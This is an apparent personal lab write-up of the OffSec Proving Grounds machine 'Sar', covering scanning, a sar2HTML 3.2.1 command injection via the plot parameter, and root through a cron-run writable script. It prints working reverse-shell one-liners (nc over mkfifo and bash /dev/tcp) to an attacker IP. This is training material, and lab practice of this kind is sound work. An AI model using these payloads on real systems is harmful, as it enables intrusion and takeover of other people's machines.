---
title: OffSec PG - Sar
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.147.35`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.147.35`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

### Table

| **Port** | **Service** | **Other details (if any)**                                   |
| -------- | ----------- | ------------------------------------------------------------ |
| 22       | SSH         | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.29 ((Ubuntu))                               |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.147.35 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

Directories/files listed &rarr;

- index.html
- robots.txt
- phpinfo.php

Robots txt reveals a directory `sar2HTML`, which has an index.php page. The version for the sar2HTML is 3.2.1.

---

## Exploitation

Google-fu reveals the existence of an RCE exploit for the sar2HTML version 3.2.1. For this exploit, `/sar2HTML/index.php?plot=;whoami` executes the command. The result can be seen on the webpage. Therefore, this was used to enumerate presence of bash, python and netcat. The `/etc/passwd` file was also printed which revealed the 2 users of importance to be `root` and `love`.

Thus, a reverse shell can be spawned using bash payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.147 3002 >/tmp/f` for the user `www-data`.

The user flag was in the `/home/` directory.

---

## Privilege Escalation

Looking at setuid binaries, the most interesting ones are `arping` and `ping`. Looking at the crontab, there is a process that runs every 5 mins as the root user &rarr; `cd /var/www/html/ && sudo ./finally.sh`. Checking the code of the file, it seems that it runs another file called `write.sh`, which is world writable.

Therefore, using a reverse shell payload to get connection from the machine would execute it as root, thereby, giving a root shell.

This can be done via `echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.147/3003 0>&1'" >> write.sh`. This gives a shell in 5 minutes. Subsequently, it also gives the root flag.

---
